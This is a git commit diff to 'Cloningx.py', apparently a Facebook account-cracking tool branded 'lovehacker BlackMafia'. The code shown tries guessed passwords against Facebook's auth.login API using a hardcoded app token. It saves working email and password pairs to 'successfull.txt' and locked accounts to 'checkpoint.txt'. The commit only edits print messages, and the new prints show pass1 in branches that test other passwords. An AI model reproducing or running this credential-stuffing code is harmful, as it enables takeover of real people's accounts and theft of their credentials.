c48b73ae5bab1ba00bbfc4e8986395d557e59bde
lovehacker <61407838+lovehacker404@users.noreply.github.com>
2020-06-29 18:26:40 +0500

    Add files via upload

--- Cloningx.py
+++ Cloningx.py
@@ -15034,14 +15034,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[Hack]   Email ' + k + c + user + ' Password' + pass1+'\n'+"\n"
+				print '\x1b[1;92m(●)Hack' + k + c + user + '(●)' + pass1+'\n'+"\n"
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'-•◈•-'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\033[1;96m[Checkpoint]   Email ' + k + c + user + ' Password ' + pass1+'\n'
+					print '\033[1;96m(●)Error' + k + c + user + '(●)' + pass1+'\n'
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'-•◈•-'+pass1+'\n')
 					cps.close()
@@ -15051,14 +15051,14 @@ def action():
  				    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				    q = json.load(data)
  				    if 'access_token' in q:
- 				        print '\x1b[1;92m[Hack]    Email' + k + c + user + ' Password ' + pass2+'\n'+"\n"
+ 				        print '\x1b[1;92m(●)Hack' + k + c + user + '(●)' + pass1+'\n'+"\n"
  				        okb = open('save/successfull.txt', 'a')
  				        okb.write(k+c+user+'-•◈•-'+pass2+'\n')
  				        okb.close()
  				        oks.append(c+user+pass2)
  				    else:
  				        if 'www.facebook.com' in q['error_msg']:
- 					        print '\033[1;96m[Checkpoint]    Email' + k + c + user + ' Password ' + pass2+'\n'
+ 					        print '\033[1;96m(●)Error' + k + c + user + '(●)' + pass1+'\n'
  					        cps = open('save/checkpoint.txt', 'a')
  					        cps.write(k+c+user+'-•◈•-'+pass2+'\n')
  					        cps.close()
@@ -15068,14 +15068,14 @@ def action():
  				            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				            q = json.load(data)
  				            if 'access_token' in q:
- 				                print '\x1b[1;92m[Hack]   Email ' + k + c + user + ' Password' + pass3+'\n'+"\n"
+ 				                print '\x1b[1;92m(●)Hack' + k + c + user + '(●)' + pass1+'\n'+"\n"
  				                okb = open('save/successfull.txt', 'a')
  				                okb.write(k+c+user+'-•◈•-'+pass3+'\n')
  				                okb.close()
  				                oks.append(c+user+pass3)
  				            else:
  				                if 'www.facebook.com' in q['error_msg']:
- 					                print '\033[1;96m[Checkpoint]    Email' + k + c + user + ' Password ' + pass3+'\n'
+ 					                print '\033[1;96m(●)Error' + k + c + user + '(●)' + pass1+'\n'
  					                cps = open('save/checkpoint.txt', 'a')
  					                cps.write(k+c+user+'-•◈•-'+pass3+'\n')
  					                cps.close()
@@ -15085,14 +15085,14 @@ def action():
  				                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
  				                    q = json.load(data)
  				                    if 'access_token' in q:
- 				                        print '\x1b[1;92m[Hack]    Email' + k + c + user + ' Password ' + pass4+'\n'+"\n"
+ 				                        print '\x1b[1;92m(●)Hack' + k + c + user + '(●)' + pass1+'\n'+"\n"
  				                        okb = open('save/successfull.txt', 'a')
  				                        okb.write(k+c+user+'-•◈•-'+pass4+'\n')
  				                        okb.close()
  				                        oks.append(c+user+pass4)
  				                    else:
  				                        if 'www.facebook.com' in q['error_msg']:
- 					                        print '\033[1;96m[Checkpoint]   Email ' + k + c + user + ' Password' + pass4+'\n'
+ 					                        print '\033[1;96m(●)Error' + k + c + user + '(●)' + pass1+'\n'
  					                        cps = open('save/checkpoint.txt', 'a')
  					                        cps.write(k+c+user+'-•◈•-'+pass4+'\n')
  					                        cps.close()
@@ -15122,7 +15122,7 @@ def action():
 \033[1;92m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 \033[1;92m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
  
- Don't Worry Your Error cp ID Will Be Open After 7 Days 
+ \033[1;96mDon't Worry Your Error ID Will Be Open After 7 Days 
 
 •\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
 : \033[1;91m ....lovehacker  BlackMafia....... \033[1;95m :
